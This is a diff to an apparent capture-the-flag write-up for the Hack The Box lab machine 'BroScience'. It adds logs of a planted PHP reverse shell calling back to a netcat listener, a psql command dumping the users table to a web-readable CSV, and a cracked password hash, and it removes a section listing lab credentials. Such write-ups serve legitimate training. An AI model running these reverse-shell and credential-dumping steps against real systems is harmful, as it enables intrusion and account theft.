@@ -136,24 +136,38 @@ $ python3 upload_server.py &
 $ python3 unsafe_unserialize.py /var/www/html/reverse_shell.php revshell
 ```
 
+```sh
+10.10.11.195 - - [22/Jan/2023 00:56:53] "GET /revshell HTTP/1.0" 200 -
+10.10.11.195 - - [22/Jan/2023 00:56:53] "GET /revshell HTTP/1.0" 200 -
+10.10.11.195 - - [22/Jan/2023 00:56:54] "GET /revshell HTTP/1.0" 200 -
+```
+
 - check if file got uploaded 
+
+![](/assets/2023-01-22-00-59-08.png)
+
 
 - open netcat
 ```sh
-$ nc -lvnp 4444
+$ nc -lvnp 4444 # https://broscience.htb/reverse_shell.php
+Listening on 0.0.0.0 4444
+Connection received on 10.10.11.195 39598
 
 ```
+
 we are in
 
 ## `user`
 
+- we got credentials for the database 
 
+```sh
+$ psql -h localhost -p 5432 -U dbuser -d broscience -c "\copy (SELECT * FROM users) TO '/var/www/html/users.csv' WITH CSV HEADER"
+```
 
+- `hash` for bill = 13edad4932da9dbb57d9cd15b66ed104
+- tried with bruteforcing with single world `php ./php/bruteforce.php 13edad4932da9dbb57d9cd15b66ed104`, no luck
+- `hashcat` --> `iluvhorsesandgym`
 
-## once reversed 
-<br>
+`success`
 
-- psql passwords, dump to csv
-  - psql -h localhost -p 5432 -U dbuser -d broscience -c "\copy (SELECT * FROM users) TO '/var/www/html/users.csv' WITH CSV HEADER"
-  - RangeOfMotion%777
-  - iluvhorsesandgym
